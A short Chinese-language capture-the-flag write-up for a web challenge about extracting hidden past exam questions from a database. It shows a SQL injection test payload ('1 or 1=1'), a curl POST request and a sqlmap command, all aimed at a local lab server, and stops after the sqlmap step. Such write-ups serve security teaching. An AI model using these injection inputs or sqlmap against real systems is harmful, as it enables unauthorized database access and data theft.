# [河湖小盗](https://ctf.xidian.edu.cn/games/37/challenges?challenge=1324)
##### 分值：100pts

## 题目描述：
### 原文：
听说网信院的往年试题非常神秘，都隐藏在了数据库深处，对外只公开一些无关紧要的东西

你能绕过防护拿到往年试题吗？

## 分析：
### SQL注入

## 解题步骤：
打开网站。 尝试几次，发现序号仅1，2，3，4，5有效。
序号输入`1 or 1=1`显示出五条记录，得出存在sql注入。
进入Web Inspector（Chrome 为 Devtools）的Network，查看请求方式：
```sh
curl 'http://127.0.0.1:12345/' \
-X 'POST' \
-H 'Content-Type: application/x-www-form-urlencoded' \
--data 'id=1'
```
打开终端，执行`sqlmap --batch -X POST --data=id=1 -u http://127.0.0.1:12345`
